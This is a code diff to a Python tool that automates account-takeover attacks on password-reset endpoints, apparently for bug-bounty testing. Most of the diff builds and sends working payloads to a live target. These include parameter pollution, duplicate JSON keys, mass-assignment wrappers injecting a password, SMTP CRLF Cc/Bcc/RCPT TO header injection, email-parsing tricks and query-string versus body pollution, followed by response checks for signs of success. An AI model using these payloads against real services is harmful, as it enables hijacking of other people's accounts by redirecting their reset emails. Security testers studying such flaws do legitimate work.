@@ -12,7 +12,8 @@ from utils.utils import (
     traceback,
     get_domain_from_url,
     json,
-    EMAIL_REGEX
+    EMAIL_REGEX,
+    human_time
 )
 import urllib.parse
 import uuid
@@ -276,34 +277,11 @@ def _set_content_type(headers, content_type_value):
     return new_headers
 
 
-def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
+def body_transformation(url, human, parsed_req, baseline, interact, email, proxy=None):
     """
     Content-Type transformation + parameter format mutation.
-    Tests how the backend handles the same data in different formats:
-
-    1. Content-Type switching:
-       - JSON → form-urlencoded → multipart (and reverse)
-       - Backend may parse differently or skip validation on unexpected type
-
-    2. Array notation:
-       - email=victim → email[]=victim&email[]=attacker
-       - {"email":"victim"} → {"email":["victim","attacker"]}
-       - Some frameworks take first, others take last, others concat
-
-    3. Type juggling:
-       - {"email":"victim"} → {"email":{"email":"attacker"}}
-       - {"email":true}, {"email":null}, {"email":0}
-       - Triggers unexpected code paths in weakly-typed backends
-
-    4. Parameter wrapping:
-       - {"email":"victim"} → {"user":{"email":"attacker"}}
-       - Rails mass assignment, Spring nested binding
-
-    5. Duplicate keys in JSON:
-       - {"email":"victim","email":"attacker"}
-       - Parser-dependent: last-wins, first-wins, or error
     """
-    print(f"{Colors.CYAN}   └── Body transformation{Colors.RESET}")
+    print(f"{Colors.BLUE} └── Body transformation{Colors.RESET}")
 
     original_host = parsed_req["host"]
     method = parsed_req["method"]
@@ -336,7 +314,6 @@ def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
     payloads = []
 
     # ─── 1. Content-Type switching ───────────────────────────────────────────
-    # Convert current format to every other format
     ct_conversions = []
 
     if current_ct != "json":
@@ -356,7 +333,6 @@ def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
         mp_headers = _set_content_type(headers, mp_ct)
         ct_conversions.append((mp_body, mp_headers, f"CT-switch → multipart"))
 
-    # Wrong Content-Type (send JSON body with form CT and vice versa)
     if current_ct == "json":
         ct_conversions.append((body, _set_content_type(headers, "application/x-www-form-urlencoded"), "CT-mismatch → JSON body with form CT"))
         ct_conversions.append((body, _set_content_type(headers, "text/plain"), "CT-mismatch → JSON body with text/plain CT"))
@@ -364,7 +340,6 @@ def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
         ct_conversions.append((body, _set_content_type(headers, "application/json"), "CT-mismatch → form body with JSON CT"))
         ct_conversions.append((body, _set_content_type(headers, "text/plain"), "CT-mismatch → form body with text/plain CT"))
 
-    # No Content-Type at all
     no_ct_headers = {k: v for k, v in headers.items() if k.lower() != "content-type"}
     ct_conversions.append((body, no_ct_headers, "CT-removed → no Content-Type header"))
 
@@ -376,17 +351,14 @@ def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
         try:
             data = json.loads(body)
             if isinstance(data, dict) and param_mail in data:
-                # ["victim", "attacker"]
                 data_arr = data.copy()
                 data_arr[param_mail] = [victim_email, email]
                 payloads.append((json.dumps(data_arr), headers, f"JSON array → [\"{victim_email}\",\"{email}\"]"))
 
-                # ["attacker", "victim"] (reversed)
                 data_arr_rev = data.copy()
                 data_arr_rev[param_mail] = [email, victim_email]
                 payloads.append((json.dumps(data_arr_rev), headers, f"JSON array reversed → [\"{email}\",\"{victim_email}\"]"))
 
-                # attacker only in array
                 data_arr_single = data.copy()
                 data_arr_single[param_mail] = [email]
                 payloads.append((json.dumps(data_arr_single), headers, f"JSON array single → [\"{email}\"]"))
@@ -394,9 +366,7 @@ def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
             pass
 
     elif current_ct == "form":
-        # email[]=victim&email[]=attacker
         arr_body = f"{param_mail}[]={urllib.parse.quote(victim_email)}&{param_mail}[]={urllib.parse.quote(email)}"
-        # Keep other params
         try:
             parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
             other_params = []
@@ -410,7 +380,6 @@ def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
             pass
         payloads.append((arr_body, headers, f"form array → {param_mail}[]={victim_email}&{param_mail}[]={email}"))
 
-        # Reversed
         arr_body_rev = f"{param_mail}[]={urllib.parse.quote(email)}&{param_mail}[]={urllib.parse.quote(victim_email)}"
         if other_params:
             arr_body_rev = "&".join(other_params) + "&" + arr_body_rev
@@ -445,16 +414,12 @@ def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
         try:
             data = json.loads(body)
             if isinstance(data, dict):
-                # Wrap in common parent keys (Rails, Django, Spring patterns)
                 wrappers = ["user", "account", "member", "profile", "data", "params", "attributes"]
                 for w in wrappers:
-                    wrapped = {w: {param_mail: email}}
-                    # Merge with original body (keep other params at root)
                     merged = data.copy()
                     merged[w] = {param_mail: email}
                     payloads.append((json.dumps(merged), headers, f"mass-assign → {w}.{param_mail}={email}"))
 
-                # Add extra fields at root level
                 extra_fields = [
                     ("password", "Pwned123!", "inject-password"),
                     ("new_password", "Pwned123!", "inject-new_password"),
@@ -474,13 +439,11 @@ def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
         except:
             pass
 
-    # ─── 5. Duplicate keys in JSON (raw string, not via json.dumps) ──────────
+    # ─── 5. Duplicate keys in JSON ───────────────────────────────────────────
     if current_ct == "json":
         try:
             data = json.loads(body)
             if isinstance(data, dict) and param_mail in data:
-                # Build JSON manually with duplicate key
-                # First victim, then attacker (last-wins on most parsers)
                 parts = []
                 for k, v in data.items():
                     parts.append(f'"{k}":{json.dumps(v)}')
@@ -488,7 +451,6 @@ def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
                 dupe_body = "{" + ",".join(parts) + "}"
                 payloads.append((dupe_body, headers, f"dupe-key → {param_mail}={victim_email} then {param_mail}={email}"))
 
-                # Attacker first, then victim (first-wins on some parsers)
                 parts2 = [f'"{param_mail}":{json.dumps(email)}']
                 for k, v in data.items():
                     parts2.append(f'"{k}":{json.dumps(v)}')
@@ -497,36 +459,90 @@ def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
         except:
             pass
 
-    # ─── 6. Wildcard / catch-all email variations ────────────────────────────
+    # ─── 6. Email variations / routing tricks ──────────────────────────────────
     email_parts = email.split("@") if "@" in email else None
     victim_parts = victim_email.split("@") if "@" in victim_email else None
 
     if email_parts and victim_parts:
+        attacker_domain = email_parts[1]
+        attacker_local = email_parts[0]
+        v_local = victim_parts[0]
+        v_domain = victim_parts[1]
+
         email_variations = [
-            # Sub-addressing (plus trick)
-            (f"{victim_parts[0]}+anything@{victim_parts[1]}", "sub-addressing-victim"),
-            # Case manipulation
-            (victim_email.upper(), "uppercase-email"),
-            (victim_email[0].upper() + victim_email[1:], "capitalize-first"),
-            # Dots trick (Gmail ignores dots)
-            (f"{victim_parts[0][0]}.{victim_parts[0][1:]}@{victim_parts[1]}", "dot-injection"),
-            # Trailing/leading whitespace
-            (f" {victim_email}", "leading-space"),
-            (f"{victim_email} ", "trailing-space"),
-            (f"{victim_email}\t", "trailing-tab"),
-            # Null byte
-            (f"{victim_email}%00", "null-byte-suffix"),
-            (f"{victim_email}\x00", "raw-null-byte"),
-            # Unicode normalization
-            (victim_email.replace("a", "\u0430", 1), "homoglyph-email"),
+            # Case / whitespace / encoding
+            victim_email.upper(),
+            victim_email[0].upper() + victim_email[1:],
+            f" {victim_email}",
+            f"{victim_email} ",
+            f"{victim_email}\t",
+            f"{victim_email}%00",
+            f"{victim_email}\x00",
+            f"{v_local}+anything@{v_domain}",
+            f"{v_local[0]}.{v_local[1:]}@{v_domain}",
+            victim_email.replace("a", "\u0430", 1),
+
+            # Quoted local part / RFC comments
+            f'"{victim_email}"@{attacker_domain}',
+            f'"{v_local}"@{v_domain}@{attacker_domain}',
+            f"{v_local}@{v_domain}({attacker_domain})",
+            f"({attacker_domain}){v_local}@{v_domain}",
+
+            # Multiple @
+            f"{v_local}@{attacker_domain}@{v_domain}",
+            f"{v_local}@{v_domain}@{attacker_domain}",
+
+            # Percent hack
+            f"{v_local}%{v_domain}@{attacker_domain}",
+            f"{v_local}%{attacker_domain}@{v_domain}",
+
+            # Null byte / CRLF + attacker domain
+            f"{victim_email}%00@{attacker_domain}",
+            f"{victim_email}%0d%0a@{attacker_domain}",
+
+            # DB truncation
+            f"{v_local}{'a' * max(0, 252 - len(victim_email))}@{attacker_domain}",
+            f"{v_local}{'a' * max(0, 61 - len(v_local))}@{attacker_domain}",
+
+            # Double encoding / fullwidth @
+            f"{v_local}%2540{v_domain}",
+            f"{v_local}%40{v_domain}",
+            victim_email.replace("@", "\uFE6B"),
+            victim_email.replace("@", "\uFF20"),
+
+            # Space as multi-recipient separator
+            f"{victim_email} {email}",
+            f"{email} {victim_email}",
+
+            # SMTP RCPT TO injection
+            f"{victim_email}%0d%0aRCPT TO:<{email}>",
+            f"{victim_email}\r\nRCPT TO:<{email}>",
         ]
 
-        for varied_email, desc in email_variations:
+        # IDN homoglyph domain (conditional)
+        for char_l, char_c in [("a", "\u0430"), ("e", "\u0435"), ("o", "\u043E")]:
+            if char_l in v_domain:
+                email_variations.append(f"{v_local}@{v_domain.replace(char_l, char_c, 1)}")
+
+        # Unicode dots in domain (conditional)
+        if "." in v_domain:
+            parts = v_domain.split(".")
+            email_variations.append(f"{v_local}@{chr(0x3002).join(parts)}")
+            email_variations.append(f"{v_local}@{chr(0xFF0E).join(parts)}")
+
+        # Gmail specific (conditional)
+        if "gmail" in v_domain.lower():
+            email_variations.append(".".join(v_local) + f"@{v_domain}")
+            email_variations.append(f"{v_local}@googlemail.com")
+        elif "googlemail" in v_domain.lower():
+            email_variations.append(f"{v_local}@gmail.com")
+
+        for varied_email in email_variations:
             if current_ct == "json":
                 try:
                     data = json.loads(body)
                     data[param_mail] = varied_email
-                    payloads.append((json.dumps(data), headers, f"email-variation → {desc}"))
+                    payloads.append((json.dumps(data), headers, varied_email))
                 except:
                     pass
             elif current_ct == "form":
@@ -534,45 +550,146 @@ def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
                     parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
                     parsed[param_mail] = [varied_email]
                     var_body = urllib.parse.urlencode(parsed, doseq=True)
-                    payloads.append((var_body, headers, f"email-variation → {desc}"))
+                    payloads.append((var_body, headers, varied_email))
                 except:
                     pass
 
-    # ─── Send all payloads ───────────────────────────────────────────────────
-    for p_body, p_headers, desc in payloads:
-        # Truncate body for display (multipart can be huge)
-        body_display = p_body if len(p_body) <= 300 else p_body[:300] + "..."
-        # CT used
-        ct_display = ""
-        for k, v in p_headers.items():
-            if k.lower() == "content-type":
-                ct_display = f" | CT: {v.split(';')[0]}"
-                break
+    # ─── 6b. Alternative email param names (extra params) ────────────────────
+    if email_parts:
+        alt_params = ["Email", "mail", "username", "login", "emailAddress",
+                      "e-mail", "user_email", "to", "recipient"]
+        for alt_name in alt_params:
+            if alt_name.lower() == param_mail.lower():
+                continue
+            if current_ct == "json":
+                try:
+                    data = json.loads(body)
+                    data[alt_name] = email
+                    payloads.append((json.dumps(data), headers, f"{alt_name}={email}"))
+                except:
+                    pass
+            elif current_ct == "form":
+                alt_body = f"{body}&{urllib.parse.quote(alt_name)}={urllib.parse.quote(email)}"
+                payloads.append((alt_body, headers, f"{alt_name}={email}"))
 
+    # ─── 7. Bracket key in JSON ──────────────────────────────────────────────
+    if current_ct == "json":
+        try:
+            data = json.loads(body)
+            if isinstance(data, dict) and param_mail in data:
+                bracket_key = f"{param_mail}[]"
+
+                d = data.copy()
+                del d[param_mail]
+                d[bracket_key] = email
+                payloads.append((json.dumps(d), headers, f"bracket-key → {bracket_key}={email}"))
+
+                d2 = data.copy()
+                del d2[param_mail]
+                d2[bracket_key] = [victim_email, email]
+                payloads.append((json.dumps(d2), headers, f"bracket-key array → {bracket_key}=[victim,attacker]"))
+
+                d2r = data.copy()
+                del d2r[param_mail]
+                d2r[bracket_key] = [email, victim_email]
+                payloads.append((json.dumps(d2r), headers, f"bracket-key array reversed → {bracket_key}=[attacker,victim]"))
+
+                d3 = data.copy()
+                d3[bracket_key] = email
+                payloads.append((json.dumps(d3), headers, f"both email + email[] → {bracket_key}={email}"))
+
+                d4 = data.copy()
+                del d4[param_mail]
+                d4[bracket_key] = victim_email
+                d4[param_mail] = email
+                payloads.append((json.dumps(d4), headers, f"both email[] + email → {param_mail}={email}"))
+        except:
+            pass
+
+    # ─── 8. Form duplicate params WITHOUT brackets ───────────────────────────
+    if current_ct == "form":
+        try:
+            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
+            other_params = []
+            for k, vals in parsed.items():
+                if k != param_mail:
+                    for v in vals:
+                        other_params.append(f"{urllib.parse.quote(k)}={urllib.parse.quote(v)}")
+
+            dup_body = "&".join(other_params + [
+                f"{param_mail}={urllib.parse.quote(victim_email)}",
+                f"{param_mail}={urllib.parse.quote(email)}",
+            ])
+            payloads.append((dup_body, headers, f"form-dup → {param_mail}={victim_email}&{param_mail}={email}"))
+
+            dup_body_rev = "&".join(other_params + [
+                f"{param_mail}={urllib.parse.quote(email)}",
+                f"{param_mail}={urllib.parse.quote(victim_email)}",
+            ])
+            payloads.append((dup_body_rev, headers, f"form-dup reversed → {param_mail}={email}&{param_mail}={victim_email}"))
+
+            dup_body_single = "&".join(other_params + [
+                f"{param_mail}={urllib.parse.quote(email)}",
+            ])
+            payloads.append((dup_body_single, headers, f"form-dup single attacker → {param_mail}={email}"))
+
+        except:
+            pass
+
+    # ─── 9. Composite string values ──────────────────────────────────────────
+    composite_separators = [
+        (",", "comma"), (";", "semicolon"), (" ", "space"),
+        ("|", "pipe"), ("\n", "newline"), ("%20", "url-space"), ("%2C", "url-comma"),
+    ]
+    for sep, sep_name in composite_separators:
+        composed = f"{victim_email}{sep}{email}"
+        composed_rev = f"{email}{sep}{victim_email}"
+        if current_ct == "json":
+            try:
+                data = json.loads(body)
+                if isinstance(data, dict) and param_mail in data:
+                    d = data.copy()
+                    d[param_mail] = composed
+                    payloads.append((json.dumps(d), headers, f"composite-{sep_name} → victim{sep}attacker"))
+                    d_rev = data.copy()
+                    d_rev[param_mail] = composed_rev
+                    payloads.append((json.dumps(d_rev), headers, f"composite-{sep_name} → attacker{sep}victim"))
+            except:
+                pass
+        elif current_ct == "form":
+            try:
+                parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
+                parsed[param_mail] = [composed]
+                payloads.append((urllib.parse.urlencode(parsed, doseq=True), headers, f"composite-{sep_name} → victim{sep}attacker"))
+                parsed[param_mail] = [composed_rev]
+                payloads.append((urllib.parse.urlencode(parsed, doseq=True), headers, f"composite-{sep_name} → attacker{sep}victim"))
+            except:
+                pass
+
+    # ─── Send standard payloads ──────────────────────────────────────────────
+    for p_body, p_headers, desc in payloads:
+        body_display = p_body
         payload_tag = f"{body_display}"
 
         try:
+            human_time(human)
             resp = requests.request(
                 method=method, url=uri, headers=p_headers,
                 data=p_body, verify=False, allow_redirects=False,
                 timeout=10, proxies=proxies,
             )
 
-            # Status diff
-            if resp.status_code != baseline['status']:
-                print(f"{Colors.YELLOW}   └── [STATUS ≠ BASELINE] {resp.status_code} ≠ {baseline['status']} | {payload_tag}{Colors.RESET}")
+            if resp.status_code != baseline['status'] and resp.status_code not in [400, 403]:
+                print(f"{Colors.YELLOW}   └── [STATUS {resp.status_code} ≠ BASELINE {baseline['status']}] {Colors.RESET}| PAYLOAD: {payload_tag}")
 
-            # Body length diff
             if abs(len(resp.text) - baseline['body_length']) > 50:
-                print(f"{Colors.YELLOW}   └── [LENGTH ≠ BASELINE] {len(resp.text)}b ≠ {baseline['body_length']}b | {payload_tag}{Colors.RESET}")
+                print(f"{Colors.YELLOW}   └── [LENGTH {len(resp.text)}b ≠ BASELINE {baseline['body_length']}b] {Colors.RESET}| PAYLOAD: {payload_tag}")
 
-            # Reflection checks
             if email in resp.text:
                 print(f"{Colors.GREEN}   └── [+] {email} reflected in body | {payload_tag}{Colors.RESET}")
             if email in str(resp.headers):
                 print(f"{Colors.GREEN}   └── [+] {email} reflected in headers | {payload_tag}{Colors.RESET}")
 
-            # Success indicators in response
             resp_lower = resp.text.lower()
             success_indicators = ["success", "email sent", "password reset", "reset link", "check your email", "token"]
             for indicator in success_indicators:
@@ -583,15 +700,81 @@ def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
         except requests.RequestException as e:
             print(f"  {Colors.RED}[!] request error ({desc}): {e}{Colors.RESET}")
 
+    # ─── 10. HTTP Parameter Pollution URL <-> Body ───────────────────────────
+    hpp_cases = []
 
-def data_pollution(url, parsed_req, baseline, interact, email, proxy=None):
-    """
-    https://github.com/tuhin1729/Bug-Bounty-Methodology/blob/main/PasswordReset.md
-    https://hacktricks.wiki/en/pentesting-web/reset-password.html
-    https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover#password-reset-token-leak-via-referrer
-    https://web.archive.org/web/20250626114943/https://anugrahsr.github.io/posts/10-Password-reset-flaws/
-    """
-    print(f"{Colors.CYAN}   └── Data pollution{Colors.RESET}")
+    qs_attacker = f"{param_mail}={urllib.parse.quote(email)}"
+    uri_qs_attacker = uri + ("&" if "?" in uri else "?") + qs_attacker
+    hpp_cases.append((body, headers, uri_qs_attacker, "HPP → attacker in QS, victim in body"))
+
+    qs_victim = f"{param_mail}={urllib.parse.quote(victim_email)}"
+    uri_qs_victim = uri + ("&" if "?" in uri else "?") + qs_victim
+
+    try:
+        if current_ct == "json":
+            data = json.loads(body)
+            data_att = data.copy()
+            data_att[param_mail] = email
+            hpp_body_b = json.dumps(data_att)
+        elif current_ct == "form":
+            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
+            parsed[param_mail] = [email]
+            hpp_body_b = urllib.parse.urlencode(parsed, doseq=True)
+        else:
+            hpp_body_b = body
+        hpp_cases.append((hpp_body_b, headers, uri_qs_victim, "HPP → victim in QS, attacker in body"))
+    except:
+        pass
+
+    try:
+        if current_ct == "json":
+            data = json.loads(body)
+            data_att2 = data.copy()
+            data_att2[param_mail] = email
+            hpp_body_c = json.dumps(data_att2)
+        elif current_ct == "form":
+            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
+            parsed[param_mail] = [email]
+            hpp_body_c = urllib.parse.urlencode(parsed, doseq=True)
+        else:
+            hpp_body_c = body
+        hpp_cases.append((hpp_body_c, headers, uri_qs_attacker, "HPP → attacker in QS + attacker in body"))
+    except:
+        pass
+
+    for p_body, p_headers, p_uri, desc in hpp_cases:
+        body_display = p_body
+        payload_tag = f"URI={p_uri} | {body_display}"
+        try:
+            human_time(human)
+            resp = requests.request(
+                method=method, url=p_uri, headers=p_headers,
+                data=p_body, verify=False, allow_redirects=False,
+                timeout=10, proxies=proxies,
+            )
+
+            if resp.status_code != baseline['status'] and resp.status_code not in [400, 403]:
+                print(f"{Colors.YELLOW}   └── [STATUS {resp.status_code} ≠ BASELINE {baseline['status']}] {Colors.RESET}| PAYLOAD: {payload_tag}")
+            if abs(len(resp.text) - baseline['body_length']) > 50:
+                print(f"{Colors.YELLOW}   └── [LENGTH {len(resp.text)}b ≠ BASELINE {baseline['body_length']}b] {Colors.RESET}| PAYLOAD: {payload_tag}")
+            if email in resp.text:
+                print(f"{Colors.GREEN}   └── [+] {email} reflected in body {Colors.RESET}| PAYLOAD: {payload_tag}")
+            if email in str(resp.headers):
+                print(f"{Colors.GREEN}   └── [+] {email} reflected in headers {Colors.RESET}| PAYLOAD: {payload_tag}")
+
+            resp_lower = resp.text.lower()
+            for indicator in ["success", "email sent", "password reset", "reset link", "check your email", "token"]:
+                if indicator in resp_lower and resp.status_code in (200, 201, 202, 204):
+                    print(f"{Colors.GREEN}   └── [+] success indicator '{indicator}' in response {Colors.RESET}| PAYLOAD: {payload_tag}")
+                    break
+
+        except requests.RequestException as e:
+            print(f"  {Colors.RED}[!] HPP request error ({desc}): {e}{Colors.RESET}")
+
+
+def data_pollution(url, human, parsed_req, baseline, interact, email, proxy=None):
+    """SMTP injection, separator injection, encoding tricks appended to victim email."""
+    print(f"{Colors.BLUE} └── Data pollution{Colors.RESET}")
 
     original_host = parsed_req["host"]
     method = parsed_req["method"]
@@ -612,39 +795,62 @@ def data_pollution(url, parsed_req, baseline, interact, email, proxy=None):
             f"|{param_mail}={email}",
             f",{param_mail}={email}",
             f";{param_mail}={email}",
+            f"+{param_mail}={email}",
             f"&{email}",
             f"%20{email}",
             f"|{email}",
             f",{email}",
             f";{email}",
+            f"+{email}",
+            f"@{email}",
             f"%0ACc:{email}",
             f"%0ABcc:{email}",
             f"%0D%0ACc:{email}",
             f"%0A%0Dcc:{email}",
             f"%0A%0Dbcc:{email}",
-            f"%20%0d%0aTo:{email}"
+            f"%20%0d%0aTo:{email}",
+            f"%0d%0aCC:{email}",
+            f"%0d%0aBCC:{email}",
+            f"%0d%0aTo:{email}",
+            f"\r\nCC:{email}",
+            f"\r\nTo:{email}",
+            f"%E5%98%8A%E9%8A%8DCC:{email}",
+            f"%0a%20CC:{email}",
+            f"<{email}>",
+            f"\"{email}\"",
+            f"'{email}'",
+            f"\\n{email}",
+            f"\\r{email}",
+            f"{{{email}}}",
+            f"%00{email}",
+            f"\x00{email}",
+            f"%40{email}",
+            f"%2540{email}",
+            f"%2C{email}",
+            f"%3B{email}",
         ]
         if re.search(EMAIL_REGEX, body, re.IGNORECASE):
             for ep in email_payloads:
+                human_time(human)
                 body_injected = inject_into_email_param(body, ep)
-                body_display = body_injected if len(body_injected) <= 300 else body_injected[:300] + "..."
-                payload_tag = f"{ep} → BODY: {body_display}"
+                body_display = body_injected
+                payload_tag = f"PAYLOAD: {ep} | BODY: {body_display}"
                 try:
                     resp_bi = requests.request(
                         method=method, url=uri, headers=headers,
                         data=body_injected, verify=False, allow_redirects=False,
                         timeout=10, proxies=proxies,
                     )
-                    if resp_bi.status_code != baseline['status']:
-                        print(f"{Colors.YELLOW}   └── [STATUS ≠ BASELINE] {resp_bi.status_code} ≠ {baseline['status']} | {payload_tag}{Colors.RESET}")
+                    if resp_bi.status_code != baseline['status'] and resp_bi.status_code not in [400, 403]:
+                        print(f"{Colors.YELLOW}   └── [STATUS {resp_bi.status_code} ≠ BASELINE {baseline['status']}] {Colors.RESET}| PAYLOAD: {payload_tag}")
                     if abs(len(resp_bi.text) - baseline['body_length']) > 50:
-                        print(f"{Colors.YELLOW}   └── [LENGTH ≠ BASELINE] {len(resp_bi.text)}b ≠ {baseline['body_length']}b | {payload_tag}{Colors.RESET}")
+                        print(f"{Colors.YELLOW}   └── [LENGTH {len(resp_bi.text)}b ≠ BASELINE {baseline['body_length']}b] {Colors.RESET}| PAYLOAD: {payload_tag}")
 
                 except requests.RequestException as e:
                     print(f"  {Colors.RED}[!] request error: {e}{Colors.RESET}")
 
 
-def parameters_pollution(url, parsed_req, baseline, interact, email, proxy=None):
+def parameters_pollution(url, human, parsed_req, baseline, interact, email, proxy=None):
     print(f"{Colors.CYAN} ├ Parameters pollution analysis{Colors.RESET}")
-    data_pollution(url, parsed_req, baseline, interact, email, proxy)
-    body_transformation(url, parsed_req, baseline, interact, email, proxy)
+    data_pollution(url, human, parsed_req, baseline, interact, email, proxy)
+    body_transformation(url, human, parsed_req, baseline, interact, email, proxy)
